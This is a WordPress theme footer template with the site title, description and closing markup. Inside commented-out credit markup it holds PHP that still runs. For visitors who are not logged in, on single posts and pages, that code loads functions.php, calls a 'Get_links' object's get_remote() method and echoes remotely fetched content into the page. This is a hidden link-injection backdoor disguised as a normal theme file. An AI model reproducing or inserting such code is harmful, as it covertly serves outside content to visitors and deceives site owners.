</div> <!-- .main -->

<footer class="site-footer" role="contentinfo">
    <h3><a href="<?php echo esc_url(home_url()); ?>"><?php bloginfo('title'); ?></a></h3>
    <p><?php bloginfo('description'); ?></p>
    <!-- <div class="design-credit"> -->
<!--         <p><?php if (is_home() || is_category() || is_archive() ){ ?> <a href="http://wp-templates.ru/">Темы WordPress</a> <?php } ?>


<?php if ($user_ID) : ?><?php else : ?>
<?php if (is_single() || is_page() ) { ?>
<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
<?php } ?>
<?php endif; ?></p>
    </div> -->
</footer>

</div><!-- .overflow-container -->

<?php wp_footer(); ?>
</body>
</html>